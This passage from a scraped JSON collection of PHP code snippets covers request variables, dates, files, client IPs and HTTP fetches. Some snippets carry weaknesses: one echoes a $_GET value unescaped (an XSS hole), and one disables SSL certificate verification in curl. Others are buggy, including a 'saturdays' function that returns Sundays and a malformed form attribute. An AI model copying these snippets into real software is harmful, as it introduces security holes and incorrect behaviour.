    "description": "#Get Method and Post Data  Send data through get and Post  $_GET Example ============ <?php if(isset($_GET['name'])){ echo htmlentities($_GET['name']); //or //$name = htmlentities($_GET['name']); //echo $name print_r($_GET); } ?> <!DOCTYPE html> <html> <head>     <title>Get post website</title>     </head> <body>     <form method=\"GET action=get_post.php\">         <div>             <label>Name</label><br>             <input type=\"text\" name =\"name\">         </div>         <div>             <label>Email</label><br>             <input type=\"text\" name =\"email\">         </div>         <input type=\"submit\" value =\"Submit\">     </form> </body> </html> ================ $_POST Example ================ <?php if(isset($_GET['name'])){ //echo htmlentities($_GET['name']); //or //$name = htmlentities($_GET['name']); //echo $name //print_r($_GET); }  if(isset($_POST['name'])){     $name = htmlentities($_POST['name']);     echo $name;     print_r($_POST); } ?> <!DOCTYPE html> <html> <head>     <title>Get post website</title>     </head> <body>     <form method=\"POST\" action=\"get_post.php\">         <div>             <label>Name</label><br>             <input type=\"text\" name =\"name\">         </div>         <div>             <label>Email</label><br>             <input type=\"text\" name =\"email\">         </div>         <input type=\"submit\" value =\"Submit\">     </form> </body> </html> ================ $_REQUEST Example  //another uncommon way to do it. This is not    //normally done this way ================ <?php if(isset($_REQUEST['name'])){     $name = htmlentities($_REQUEST['name']);     echo $name;     print_r($_REQUEST); }  ?> <!DOCTYPE html> <html> <head>     <title>Get post website</title>     </head> <body>     <form method=\"POST\" action=\"get_post.php\">         <div>             <label>Name</label><br>             <input type=\"text\" name =\"name\">         </div>         <div>             <label>Email</label><br>             <input type=\"text\" name =\"email\">         </div>         <input type=\"submit\" value =\"Submit\">     </form> </body> </html> ================ $_SERVER['QUERY_STRING']  Example ================ <?php echo $_SERVER['QUERY_STRING'];   ?> <!DOCTYPE html> <html> <head>     <title>Get post website</title>     </head> <body>     <form method=\"POST\" action=\"get_post.php\">         <div>             <label>Name</label><br>             <input type=\"text\" name =\"name\">         </div>         <div>             <label>Email</label><br>             <input type=\"text\" name =\"email\">         </div>         <input type=\"submit\" value =\"Submit\">     </form> </body> </html>\n<form action=\"/\" method=\"get\">   <input type=\"text\" name=\"name\">   <br>   <input type=\"submit\"> </form> <?php   echo $_GET[\"query\"]; ?>\n",
    "reg_date": "2021-10-12T10:18:17.000Z"
  },
  {
    "id": 3603,
    "keyword": null,
    "link": null,
    "title": " php get age from dob",
    "description": "Simple method for calculating Age from dob: $_age = floor((time() - strtotime('1986-09-16')) / 31556926); 31556926 is the number of seconds in a year.\n",
    "reg_date": "2021-10-12T10:18:17.000Z"
  },
  {
    "id": 3604,
    "keyword": null,
    "link": null,
    "title": " php get all elements of array except last",
    "description": "$array = array( 1,2, 3 ); $sliced = array_slice($array, 0, -1); // array ( 1,2 )\n",
    "reg_date": "2021-10-12T10:18:17.000Z"
  },
  {
    "id": 3605,
    "keyword": null,
    "link": null,
    "title": " php get all function arguments",
    "description": " <?php function foo() {     $numargs = func_num_args();     echo \"Number of arguments: $numargs \\n\";     if ($numargs >= 2) {         echo \"Second argument is: \" . func_get_arg(1) . \"\\n\";     }     $arg_list = func_get_args();     for ($i = 0; $i < $numargs; $i++) {         echo \"Argument $i is: \" . $arg_list[$i] . \"\\n\";     } }  foo(1, 2, 3); ?>  \n",
    "reg_date": "2021-10-12T10:18:17.000Z"
  },
  {
    "id": 3606,
    "keyword": null,
    "link": null,
    "title": " php get all php files in a directory",
    "description": "$path    = './'; $files = scandir($path); $files = array_diff(scandir($path), array('.', '..')); foreach($files as $file){   echo \"<a href='$file'>$file</a>\"; }\nforeach(glob('includes/*.php') as $file) {     ... }\n",
    "reg_date": "2021-10-12T10:18:17.000Z"
  },
  {
    "id": 3607,
    "keyword": null,
    "link": null,
    "title": " php get all saturdays in a month",
    "description": "function getSundays($y, $m) {     return new DatePeriod(         new DateTime(\"first sunday of $y-$m\"),         DateInterval::createFromDateString('next sunday'),         new DateTime(\"last day of $y-$m\")     ); }  // Usage: foreach (getSundays(2021, 03) as $sundays) {     echo $sundays->format(\"l, Y-m-d\\n\"); }\n",
    "reg_date": "2021-10-12T10:18:18.000Z"
  },
  {
    "id": 3608,
    "keyword": null,
    "link": null,
    "title": " php get all txt files in directory",
    "description": "$path = '/path/to/directory'; $files = glob($path.\"/*.txt\"); foreach ($files as $file) {   echo $file;   echo '<br>'; } /* Outputs something like:  \t/path/to/directory/someFile.txt \t/path/to/directory/someOtherFile.txt \t/path/to/directory/anotherFile.txt */\n",
    "reg_date": "2021-10-12T10:18:18.000Z"
  },
  {
    "id": 3609,
    "keyword": null,
    "link": null,
    "title": " php get all url parameters",
    "description": "<?php   print_r($_REQUEST); ?> \n",
    "reg_date": "2021-10-12T10:18:18.000Z"
  },
  {
    "id": 3610,
    "keyword": null,
    "link": null,
    "title": " php get all values from array",
    "description": "array_values(array)\n",
    "reg_date": "2021-10-12T10:18:18.000Z"
  },
  {
    "id": 3611,
    "keyword": null,
    "link": null,
    "title": " php get and print file contents",
    "description": "<?php file_get_contents(\"file.txt\"); ?>\n <?php // Read 14 characters starting from the 21st character $section = file_get_contents('./people.txt', FALSE, NULL, 20, 14); var_dump($section); ?>  \n",
    "reg_date": "2021-10-12T10:18:18.000Z"
  },
  {
    "id": 3612,
    "keyword": null,
    "link": null,
    "title": " php get array average",
    "description": "$myArray=[1,5,4,3]; $average = array_sum($myArray)/count($myArray);\n",
    "reg_date": "2021-10-12T10:18:18.000Z"
  },
  {
    "id": 3613,
    "keyword": null,
    "link": null,
    "title": " php get browser",
    "description": "function get_browser_name($user_agent){     $t = strtolower($user_agent);     $t = \" \" . $t;     if     (strpos($t, 'opera'     ) || strpos($t, 'opr/')     ) return 'Opera'            ;        elseif (strpos($t, 'edge'      )                           ) return 'Edge'             ;        elseif (strpos($t, 'chrome'    )                           ) return 'Chrome'           ;        elseif (strpos($t, 'safari'    )                           ) return 'Safari'           ;        elseif (strpos($t, 'firefox'   )                           ) return 'Firefox'          ;        elseif (strpos($t, 'msie'      ) || strpos($t, 'trident/7')) return 'Internet Explorer';     return 'Unkown'; } echo get_browser_name($_SERVER['HTTP_USER_AGENT']);//Chrome\n<?php   echo $_SERVER['HTTP_USER_AGENT'];   $browser = get_browser();   print_r($browser); ?>\necho Hallo\n",
    "reg_date": "2021-10-12T10:18:18.000Z"
  },
  {
    "id": 3614,
    "keyword": null,
    "link": null,
    "title": " php get char from string position",
    "description": "//You can use your string the same as an array : $some_string = \"apple\"; echo $some_string[2]; //echo \"p\"\n$censured_data = '** ** ** ' . substr($row['credit_card_number_from_db'], -4);\n",
    "reg_date": "2021-10-12T10:18:18.000Z"
  },
  {
    "id": 3615,
    "keyword": null,
    "link": null,
    "title": " php get class name of this",
    "description": "get_class($this);\n// create an object $bar = new foo();  // external call echo \"Its name is \" , get_class($bar) , \"\\n\";\n",
    "reg_date": "2021-10-12T10:18:18.000Z"
  },
  {
    "id": 3616,
    "keyword": null,
    "link": null,
    "title": " php get client ip",
    "description": "The simplest way to collect the Client/Visitor IP address using PHP is the REMOTE_ADDR. Pass the 'REMOTE_ADDR' in PHP $_SERVER variable. It will return the IP address of the visitor who is currently viewing the webpage.  Get the IP address of the website <?php echo 'User IP Address : '. $_SERVER['REMOTE_ADDR']; ?>    /* I Hope it will help you. Namaste Stay Home Stay Safe */\n$ip = $_SERVER['REMOTE_ADDR'];\n$_SERVER['REMOTE_ADDR']\n$clientIPAddress=$_SERVER['REMOTE_ADDR']; \n<?php echo 'User IP Address : '. $_SERVER['REMOTE_ADDR']; ?>\n$exec = 'ipconfig | findstr /R /C:\"IPv4.*\"'; exec($exec, $output); preg_match('/\\d+\\.\\d+\\.\\d+\\.\\d+/', $output[0], $matches); print_r($matches[0]); \n",
    "reg_date": "2021-10-12T10:18:18.000Z"
  },
  {
    "id": 3617,
    "keyword": null,
    "link": null,
    "title": " php get client ip address",
    "description": "The simplest way to collect the Client/Visitor IP address using PHP is the REMOTE_ADDR. Pass the 'REMOTE_ADDR' in PHP $_SERVER variable. It will return the IP address of the visitor who is currently viewing the webpage.  Get the IP address of the website <?php echo 'User IP Address : '. $_SERVER['REMOTE_ADDR']; ?>    /* I Hope it will help you. Namaste Stay Home Stay Safe */\n$_SERVER['REMOTE_ADDR']\n$clientIPAddress=$_SERVER['REMOTE_ADDR']; \n$exec = 'ipconfig | findstr /R /C:\"IPv4.*\"'; exec($exec, $output); preg_match('/\\d+\\.\\d+\\.\\d+\\.\\d+/', $output[0], $matches); print_r($matches[0]); \n",
    "reg_date": "2021-10-12T10:18:19.000Z"
  },
  {
    "id": 3618,
    "keyword": null,
    "link": null,
    "title": " php get content phpinfo without show",
    "description": "<?php ob_start(); @phpinfo(); $content = ob_get_contents(); ob_end_clean();  //you get all the info in $content, but the user never see the data\n",
    "reg_date": "2021-10-12T10:18:19.000Z"
  },
  {
    "id": 3619,
    "keyword": null,
    "link": null,
    "title": " php get country code from country name",
    "description": "php use BrightNucleus\\CountryCodes\\Country; // Get the name from an ISO 3166 country code. $name = Country::getNameFromCode( 'US' ); // Returns 'United States'. // Get the ISO 3166 country code from a country name. $code = Country::getCodeFromName( 'United States' ); // Returns 'US\n",
    "reg_date": "2021-10-12T10:18:19.000Z"
  },
  {
    "id": 3620,
    "keyword": null,
    "link": null,
    "title": " php get current date and time",
    "description": "$today = date(\"F j, Y, g:i a\");   // October 30, 2019, 10:42 pm $today = date(\"D M j G:i:s T Y\"); // Wed Oct 30 22:42:18 UTC 2019 $today = date(\"Y-m-d H:i:s\");     // 2019-10-30 22:42:18(MySQL DATETIME format)\ndate_default_timezone_set('Asia/Kolkata');  echo date(\"Y-m-d H:i:s\"); // time in India\n# Current date date_default_timezone_set('Asia/Kolkata');  echo date(\"Y-m-d H:i:s\");   # Current Time date_default_timezone_set(\"America/New_York\"); echo \"The time is \" . date(\"h:i:sa\");\ndate(\"Y-n-j G:i:s\"); //-->2020-10-29 23:27:15\nphpCopy<?php $DateAndTime = date('m-d-Y h:i:s a', time());   echo \"The current date and time are $DateAndTime.\"; ?> \nphpCopy<?php $Object = new DateTime();   $DateAndTime = $Object->format(\"d-m-Y h:i:s a\");   echo \"The current date and time are $DateAndTime.\"; ?> \n",
    "reg_date": "2021-10-12T10:18:19.000Z"
  },
  {
    "id": 3621,
    "keyword": null,
    "link": null,
    "title": " php get current date strtotime",
    "description": "<?php echo(strtotime(\"now\") . \"<br>\"); echo(strtotime(\"3 October 2005\") . \"<br>\"); echo(strtotime(\"+5 hours\") . \"<br>\"); echo(strtotime(\"+1 week\") . \"<br>\"); echo(strtotime(\"+1 week 3 days 7 hours 5 seconds\") . \"<br>\"); echo(strtotime(\"next Monday\") . \"<br>\"); echo(strtotime(\"last Sunday\")); ?>\n",
    "reg_date": "2021-10-12T10:18:19.000Z"
  },
  {
    "id": 3622,
    "keyword": null,
    "link": null,
    "title": " php get current datetime mysql format",
    "description": "date('Y-m-d H:i:s');\n",
    "reg_date": "2021-10-12T10:18:19.000Z"
  },
  {
    "id": 3623,
    "keyword": null,
    "link": null,
    "title": " php get current domain",
    "description": "// Warning: This can be manipulated by hackers! // If this is problematic, store the domain in a config file  $currentDomain = $_SERVER['SERVER_NAME'];\nparse_url('http://www.website.com/hey.php', PHP_URL_HOST);\n$url = 'http://google.com/dhasjkdas/sadsdds/sdda/sdads.html'; $parse = parse_url($url); echo $parse['host']; // prints 'google.com'\n$_SERVER['REQUEST_URI'] \n",
    "reg_date": "2021-10-12T10:18:19.000Z"
  },
  {
    "id": 3624,
    "keyword": null,
    "link": null,
    "title": " php get current month first date",
    "description": "current month   //half name in words   date('M'); //full name in words date('F'); //number date('m');\n<?php     // First day of this month     $d = new DateTime('first day of this month');     echo $d->format('jS, F Y'); ?>\n//get first day of the current month  $start = date(\"Y-m-1 00:00:00\"); //get current date of the month $end = date(\"Y-m-d H:i:s\");  //query data for the current month so far $query = $this->db_model->run_query(\"select column_1, column_2 from table where date_column BETWEEN '\".$start.\"' AND '\".$end.\"'\");\ndate('m');\n",
    "reg_date": "2021-10-12T10:18:19.000Z"
  },
  {
    "id": 3625,
    "keyword": null,
    "link": null,
    "title": " php get current time and date",
    "description": "echo date('Y-m-d H:i:s');  //Output something like this: //2021-07-30 10:07:45\n$today = date(\"F j, Y, g:i a\");   // October 30, 2019, 10:42 pm $today = date(\"D M j G:i:s T Y\"); // Wed Oct 30 22:42:18 UTC 2019 $today = date(\"Y-m-d H:i:s\");     // 2019-10-30 22:42:18(MySQL DATETIME format)\ndate(\"Y-n-j G:i:s\"); //-->2020-10-29 23:27:15\nphpCopy<?php $DateAndTime = date('m-d-Y h:i:s a', time());   echo \"The current date and time are $DateAndTime.\"; ?> \nphpCopy<?php $Object = new DateTime();   $Object->setTimezone(new DateTimeZone('Europe/Amsterdam')); $DateAndTime = $Object->format(\"d-m-Y h:i:s a\");   echo \"The current date and time in Amsterdam are $DateAndTime.\\n\"; $Object->setTimezone(new DateTimeZone('America/Toronto')); $DateAndTime = $Object->format(\"d-m-Y h:i:s a\");   echo \"The current date and time in Toronto are $DateAndTime.\"; ?> \ncheck here link:   http://www.eltcalendar.com/stuff/datemysqlphp.html\n",
    "reg_date": "2021-10-12T10:18:19.000Z"
  },
  {
    "id": 3626,
    "keyword": null,
    "link": null,
    "title": " php get current url host",
    "description": "<?php       if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')             $url = \"https://\";        else            $url = \"http://\";        // Append the host(domain name, ip) to the URL.        $url.= $_SERVER['HTTP_HOST'];             // Append the requested resource location to the URL        $url.= $_SERVER['REQUEST_URI'];                echo $url;     ?>   \n",
    "reg_date": "2021-10-12T10:18:19.000Z"
  },
  {
    "id": 3627,
    "keyword": null,
    "link": null,
    "title": " php get current url without filename",
    "description": "echo '//'.$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF']);\n",
    "reg_date": "2021-10-12T10:18:20.000Z"
  },
  {
    "id": 3628,
    "keyword": null,
    "link": null,
    "title": " php get current year",
    "description": "// get current year using php <?php echo date(\"Y\"); ?>\n$currentYear=date(\"Y\");//2019\n$year = date(\"y\",strtotime($mydate));\n// current year <?php echo date(\"Y\"); ?> // current month <?php echo date(\"m\"); ?> // current day <?php echo date(\"d\"); ?>\nGet the current year using PHP:    <?php  \techo date(\"Y\");  ?>\n",
    "reg_date": "2021-10-12T10:18:20.000Z"
  },
  {
    "id": 3629,
    "keyword": null,
    "link": null,
    "title": " php get data from api",
    "description": "$api_url = 'http://dummy.restapiexample.com/api/v1/employees';  // Read JSON file $json_data = file_get_contents($api_url);  // Decode JSON data into PHP array $response_data = json_decode($json_data);  // Print data if need to debug //print_r($user_data);\nuse <?php $_SERVER['REQUEST_URI'] ?> in action\"\" to get the data properly\nAdd action=\"<?php $_SERVER['REQUEST_URI']; ?>\" if you dont know just copy and paste it\n",
    "reg_date": "2021-10-12T10:18:20.000Z"
  },
  {
    "id": 3630,
    "keyword": null,
    "link": null,
    "title": " php get data from prepared select",
    "description": "// Multiple rows: $sql = \"SELECT * FROM users WHERE id=?\"; $stmt = $conn->prepare($sql);  $stmt->bind_param(\"i\", $id); $stmt->execute(); $result = $stmt->get_result(); while ($row = $result->fetch_assoc()) {     echo $row['name']; }  //Single row: $sql = \"SELECT user FROM users WHERE id=?\"; // SQL with parameters $stmt = $conn->prepare($sql);  $stmt->bind_param(\"i\", $id); $stmt->execute(); $result = $stmt->get_result(); // get the mysqli result $user = $result->fetch_assoc(); // fetch data    // Update/delete from $sql = \"UPDATE users SET rank=?, status=? WHERE id=?\"; // SQL with parameters $sql = \"DELETE FROM users WHERE id=?\"; $stmt = $conn->prepare($sql);  $stmt->bind_param('sss', $rank, $status, $id); $stmt->execute();\n//on sql server public function get_data_from($id){   $request = \"SELECT * FROM tableName WHERE id = ?\";    //preparing the request   $stmt = $this->dbh->prepare($request);    //executing the request   $stmt->execute( array($id)  );    //fetching the result of the request   $result = $stmt->fetchAll();    return $result; }\n",
    "reg_date": "2021-10-12T10:18:20.000Z"
  },
  {
    "id": 3631,
    "keyword": null,
    "link": null,
    "title": " php get date",
    "description": "$today = date(\"F j, Y, g:i a\");   // October 30, 2019, 10:42 pm $today = date(\"D M j G:i:s T Y\"); // Wed Oct 30 22:42:18 UTC 2019 $today = date(\"Y-m-d H:i:s\");     // 2019-10-30 22:42:18(MySQL DATETIME format)\ndate('Y-m-d H:i:s')\n<?php  // Use date    echo date(\"F j, Y, g:i a\");                   // March 10, 2001, 5:16 pm echo date(\"m.d.y\");                           // 03.10.01 echo date(\"j, n, Y\");                         // 10, 3, 2001 echo date(\"Ymd\");                             // 20010310 echo date('h-i-s, j-m-y, it is w Day');       // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 echo date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');     // It is the 10th day. echo date(\"D M j G:i:s T Y\");                 // Sat Mar 10 17:16:18 MST 2001 echo date('H:m:s \\m \\i\\s\\ \\t\\h\\e\\ \\m\\o\\n\\t\\h'); // 17:03:18 m is the month echo date(\"H:i:s\");                           // 17:16:18 echo date(\"Y-m-d H:i:s\");                     // 2001-03-10 17:16:18 Mysql format  ?>\n//Get current date time in PHP  // Simply: $date = date('Y-m-d H:i:s');  // Or: $date = date('Y/m/d H:i:s');  // This would return the date in the following formats respectively: $date = '2012-03-06 17:33:07'; // Or $date = '2012/03/06 17:33:07';  /**   * This time is based on the default server time zone.  * If you want the date in a different time zone,  * say if you come from Nairobi, Kenya like I do, you can set  * the time zone to Nairobi as shown below.  */  date_default_timezone_set('Africa/Nairobi');  // Then call the date functions $date = date('Y-m-d H:i:s'); // Or $date = date('Y/m/d H:i:s');  // date_default_timezone_set() function is however // supported by PHP version 5.1.0 or above. \n$timestamp = strtotime('2009-10-22');  $day = date('D', $timestamp); var_dump($day);\ndate(\"Y-m-d h:i:sa\")\n",
    "reg_date": "2021-10-12T10:18:20.000Z"
  },
  {
    "id": 3632,
    "keyword": null,
    "link": null,
    "title": " php get date between two dates",
    "description": "//get Date diff as intervals  $d1 = new DateTime(\"2018-01-10 00:00:00\"); $d2 = new DateTime(\"2019-05-18 01:23:45\"); $interval = $d1->diff($d2); $diffInSeconds = $interval->s; //45 $diffInMinutes = $interval->i; //23 $diffInHours   = $interval->h; //8 $diffInDays    = $interval->d; //21 $diffInMonths  = $interval->m; //4 $diffInYears   = $interval->y; //1  //or get Date difference as total difference $d1 = strtotime(\"2018-01-10 00:00:00\"); $d2 = strtotime(\"2019-05-18 01:23:45\"); $totalSecondsDiff = abs($d1-$d2); //42600225 $totalMinutesDiff = $totalSecondsDiff/60; //710003.75 $totalHoursDiff   = $totalSecondsDiff/60/60;//11833.39 $totalDaysDiff    = $totalSecondsDiff/60/60/24; //493.05 $totalMonthsDiff  = $totalSecondsDiff/60/60/24/30; //16.43 $totalYearsDiff   = $totalSecondsDiff/60/60/24/365; //1.35\n$startDate = new DateTime(\"2019-10-27\"); $endDate = new DateTime(\"2020-04-11\");  $difference = $endDate->diff($startDate); echo $difference->format(\"%a\");\n<?php function dateDifference($start_date, $end_date) {     // calulating the difference in timestamps      $diff = strtotime($start_date) - strtotime($end_date);           // 1 day = 24 hours      // 24 * 60 * 60 = 86400 seconds     return ceil(abs($diff / 86400)); }   // start date  $start_date = \"2016-01-02\";   // end date  $end_date = \"2016-01-21\";   // call dateDifference() function to find the number of days between two dates $dateDiff = dateDifference($start_date, $end_date);   echo \"Difference between two dates: \" . $dateDiff . \" Days \"; ?> \n$period = new DatePeriod(      new DateTime('2010-10-01'),      new DateInterval('P1D'),      new DateTime('2010-10-05') );  //Which should get you an array with DateTime objects.   //To iterate  foreach ($period as $key => $value) {     //$value->format('Y-m-d')        }\n$from_date ='01-01-2013'; $to_date ='05-01-2013';  $from_date = new DateTime($from_date); $to_date = new DateTime($to_date);  for ($date = $from_date; $date <= $to_date; $date->modify('+1 day')) {   echo $date->format('l') . \"\\n\"; }\n$date1 = \"2007-03-24\"; $date2 = \"2009-06-26\";  $diff = abs(strtotime($date2) - strtotime($date1));  $years = floor($diff / (365*60*60*24)); $months = floor(($diff - $years * 365*60*60*24) / (30*60*60*24)); $days = floor(($diff - $years * 365*60*60*24 - $months*30*60*60*24)/ (60*60*24));  printf(\"%d years, %d months, %d days\\n\", $years, $months, $days);\n",
    "reg_date": "2021-10-12T10:18:20.000Z"
  },
  {
    "id": 3633,
    "keyword": null,
    "link": null,
    "title": " php get day diff",
    "description": "$now = time(); // or your date as well $your_date = strtotime(\"2010-01-31\"); $datediff = $now - $your_date;  echo round($datediff / (60 * 60 * 24));\n",
    "reg_date": "2021-10-12T10:18:20.000Z"
  },
  {
    "id": 3634,
    "keyword": null,
    "link": null,
    "title": " php get day from date",
    "description": "$timestamp = strtotime('2009-10-22');  $day = date('D', $timestamp); var_dump($day);\n// Prints the day echo date(\"l\") . \"<br>\";\n// get day of month php // Method 1; some server not work, I had check php 7.3.24 not worked, php 7.3.8 worked cal_days_in_month(CAL_GREGORIAN, $month, $year) echo (cal_days_in_month(CAL_GREGORIAN, 2, 2020)); // => 29  // Method 2; function days_in_month($month, $year) {     // calculate number of days in a month     return $month == 2 ? ($year % 4 ? 28 : ($year % 100 ? 29 : ($year % 400 ? 28 : 29))) : (($month - 1) % 7 % 2 ? 30 : 31); }  // Method 3; echo (date('t', strtotime('2020-02-1')));\t// 29   \n// how to check the day of any date in php?  //Our YYYY-MM-DD date string. $date = $request->start_date;  //Convert the date string into a unix timestamp. $unixTimestamp = strtotime($date);  //Get the day of the week using PHP's date function. $dayOfWeek = date(\"l\", $unixTimestamp);  //Print out the day that our date fell on. $day = $date . ' fell on a ' . $dayOfWeek;\nYou can use the date function. I'm using strtotime to get the timestamp to that day ; there are other solutions, like mktime, for instance.  For instance, with the 'D' modifier, for the textual representation in three letters :  $timestamp = strtotime('2009-10-22');  $day = date('D', $timestamp); var_dump($day); You will get :  string 'Thu' (length=3) And with the 'l' modifier, for the full textual representation :  $day = date('l', $timestamp); var_dump($day); You get :  string 'Thursday' (length=8) Or the 'w' modifier, to get to number of the day (0 to 6, 0 being sunday, and 6 being saturday) :  $day = date('w', $timestamp); var_dump($day); You'll obtain :  string '4' (length=1) \n",
    "reg_date": "2021-10-12T10:18:20.000Z"
  },
  {
    "id": 3635,
    "keyword": null,
    "link": null,
    "title": " php get day of week",
    "description": "$dayofweek = date('w', strtotime($date)); $result    = date('Y-m-d', strtotime(($day - $dayofweek).' day', strtotime($date)));\ndate('w'); //gets day of week as number(0=sunday,1=monday...,6=sat)  //note:returns 0 through 6 but as string so to check if monday do this: if(date('w') == 1){ \techo \"its monday baby\"; }\n// Prints the day echo date(\"l\") . \"<br>\";\n Things to be aware of when using week numbers with years.  <?php echo date(\"YW\", strtotime(\"2011-01-07\")); // gives 201101 echo date(\"YW\", strtotime(\"2011-12-31\")); // gives 201152 echo date(\"YW\", strtotime(\"2011-01-01\")); // gives 201152 too ?>  BUT  <?php echo date(\"oW\", strtotime(\"2011-01-07\")); // gives 201101 echo date(\"oW\", strtotime(\"2011-12-31\")); // gives 201152 echo date(\"oW\", strtotime(\"2011-01-01\")); // gives 201052 (Year is different than previous example) ?>  Reason: Y is year from the date o is ISO-8601 year number W is ISO-8601 week number of year  Conclusion: if using 'W' for the week number use 'o' for the year. \n<?php \t$week=29; \t$year=2017; \t   function getStartAndEndDate($week, $year)   {       $dateTime = new DateTime();       $dateTime->setISODate($year, $week);      $result['start_date'] = $dateTime->format('d-M-Y');     $dateTime->modify('+6 days');      $result['end_date'] = $dateTime->format('d-M-Y');      return $result;   }    $dates=getStartAndEndDate($week,$year); \tprint_r($dates);  ?>\n$dateTime = new \\DateTime(); /**  * You can get the string by using format  */ $dateTime->format('Y-m-d H:i:s');\n",
    "reg_date": "2021-10-12T10:18:20.000Z"
  },
  {
    "id": 3636,
    "keyword": null,
    "link": null,
    "title": " php get directory",
    "description": "$currentDirectoryName = basename(__DIR__); echo 'Currently in the '.$currentDirectoryName .' directory <br><br>';  $fullPath = dir(getcwd()); echo 'The full path is: ' . $fullPath->path . '<br>';\n",
    "reg_date": "2021-10-12T10:18:20.000Z"
  },
  {
    "id": 3637,
    "keyword": null,
    "link": null,
    "title": " php get domain from url",
    "description": "// Warning: This can be manipulated by hackers! // If this is problematic, store the domain in a config file  $currentDomain = $_SERVER['SERVER_NAME'];\nparse_url('http://www.website.com/hey.php', PHP_URL_HOST);\n$url = 'http://google.com/dhasjkdas/sadsdds/sdda/sdads.html'; $parse = parse_url($url); echo $parse['host']; // prints 'google.com'\necho $_SERVER['SERVER_NAME']; //Outputs www.example.com \n",
    "reg_date": "2021-10-12T10:18:21.000Z"
  },
  {
    "id": 3638,
    "keyword": null,
    "link": null,
    "title": " php get domain name from url",
    "description": "// Warning: This can be manipulated by hackers! // If this is problematic, store the domain in a config file  $currentDomain = $_SERVER['SERVER_NAME'];\nparse_url('http://www.website.com/hey.php', PHP_URL_HOST);\n$url = 'http://google.com/dhasjkdas/sadsdds/sdda/sdads.html'; $parse = parse_url($url); echo $parse['host']; // prints 'google.com'\necho $_SERVER['SERVER_NAME']; //Outputs www.example.com \n",
    "reg_date": "2021-10-12T10:18:21.000Z"
  },
  {
    "id": 3639,
    "keyword": null,
    "link": null,
    "title": " php get domain name with https",
    "description": "parse_url('http://www.website.com/hey.php', PHP_URL_HOST);\n$url = 'http://google.com/dhasjkdas/sadsdds/sdda/sdads.html'; $parse = parse_url($url); echo $parse['host']; // prints 'google.com'\necho $_SERVER['SERVER_NAME']; //Outputs www.example.com \n",
    "reg_date": "2021-10-12T10:18:21.000Z"
  },
  {
    "id": 3640,
    "keyword": null,
    "link": null,
    "title": " php get elapsed time",
    "description": "// microtime(true) returns the unix timestamp plus milliseconds as a float $starttime = microtime(true); /* do stuff here */ $endtime = microtime(true); $timediff = $endtime - $starttime;\n",
    "reg_date": "2021-10-12T10:18:21.000Z"
  },
  {
    "id": 3641,
    "keyword": null,
    "link": null,
    "title": " php get end date of month",
    "description": "<?php  $query_date = '2010-02-04';  // First day of the month. echo date('Y-m-01', strtotime($query_date));  // Last day of the month. echo date('Y-m-t', strtotime($query_date));\n$a_date = \"2009-11-23\"; echo date(\"Y-m-t\", strtotime($a_date));\n// First date of the month. $monthFirstDate = date('Y-m-01', strtotime('today'));  // Last date of the month. $monthLastDate = date('Y-m-t', strtotime('today'));  // Second last date of the month $monthLastSecondDate = date('Y-m-d', strtotime('-2 day', strtotime('today')));\n",
    "reg_date": "2021-10-12T10:18:21.000Z"
  },
  {
    "id": 3642,
    "keyword": null,
    "link": null,
    "title": " php get environment variable",
    "description": "$value = getenv(\"VARNAME\"); // returns FALSE if VARNAME does not exist  $env_vars = getenv(); // if no name is specified, an associative array  // with all environment variables is returned\nputenv('NAME=VALUE');  // NAME may contain whitespaces -> putenv('NAME=VALUE')  // is not equivalent to  putenv('NAME = VALUE') \n",
    "reg_date": "2021-10-12T10:18:21.000Z"
  },
  {
    "id": 3643,
    "keyword": null,
    "link": null,
    "title": " php get file contents",
    "description": "<?php file_get_contents(\"file.txt\"); ?>\n <?php // Read 14 characters starting from the 21st character $section = file_get_contents('./people.txt', FALSE, NULL, 20, 14); var_dump($section); ?>  \n$header = 'Content-Type: multipart/form-data; boundary='.MULTIPART_BOUNDARY;\n$postdata = http_build_query([  \t'var1' => 'some content',     'var2' => 'doh' ]);  $opts = [   'https' =>     [     \t'method'  => 'POST',         'header'  => 'Content-Type: application/x-www-form-urlencoded',         'content' => $postdata     ] );  $result = file_get_contents('http://example.com/submit.php', false, stream_context_create($opts));\n",
    "reg_date": "2021-10-12T10:18:21.000Z"
  },
  {
    "id": 3644,
    "keyword": null,
    "link": null,
    "title": " php get file created date",
    "description": "$filename = 'somefile.txt'; if (file_exists($filename)) {     echo \"$filename last modified: \".date (\"F d Y H:i:s.\", filemtime($filename));   \t// somefile.txt was last changed: December 29 2020 22:16:23. } // filectime: when created // filemtime: last modified // fileatime: last accessed\n",
    "reg_date": "2021-10-12T10:18:21.000Z"
  },
  {
    "id": 3645,
    "keyword": null,
    "link": null,
    "title": " php get file extension from filename",
    "description": "$ext = pathinfo($filename, PATHINFO_EXTENSION);\n",
    "reg_date": "2021-10-12T10:18:21.000Z"
  },
  {
    "id": 3646,
    "keyword": null,
    "link": null,
    "title": " php get file location",
    "description": "# C:\\Users\\Redacted\\Desktop\\main.php include __DIR__ . DIRECTORY_SEPARATOR . 'include.php'; echoScriptPath();  # C:\\Users\\Redacted\\Desktop\\include.php function echoScriptPath() {     list($scriptPath) = get_included_files();     echo 'The script being executed is ' . $scriptPath; }\n",
    "reg_date": "2021-10-12T10:18:21.000Z"
  },
  {
    "id": 3647,
    "keyword": null,
    "link": null,
    "title": " php get file mime type",
    "description": "$fileSizeInBytes=filesize(\"/path/to/myfile.txt\"); \necho mime_content_type(\"yourfile.gif\"); //image/gif\n<?php echo filetype('/etc/passwd');  // file echo filetype('/etc/');        // dir ?>  \nfunction get_content_mime_type($content) {   $url = 'http://svn.apache.org/repos/asf/httpd/httpd/trunk/docs/conf/mime.types';   $url_live = false;   $handle = curl_init($url);   curl_setopt_array($handle, array(     CURLOPT_FOLLOWLOCATION => true,     CURLOPT_NOBODY => true,     CURLOPT_HEADER => false,     CURLOPT_RETURNTRANSFER => false,     CURLOPT_SSL_VERIFYHOST => false,     CURLOPT_SSL_VERIFYPEER => false   ));   $response = curl_exec($handle);   $httpCode = curl_getinfo($handle, CURLINFO_EFFECTIVE_URL);   $httpCode = curl_getinfo($handle, CURLINFO_HTTP_CODE);   if ($httpCode == 200)   {     $url_live = true;   }   $url_live = $url_live;   curl_close($handle);   $mimes = array();   if ($url_live)   {     $mimes_file = file_get_contents($url);     preg_match_all('#^([^\\s]{2,}?)\\s+(.+?)$#ism', $mimes_file, $matches, PREG_SET_ORDER);     foreach ($matches as $match)     {       $exts = 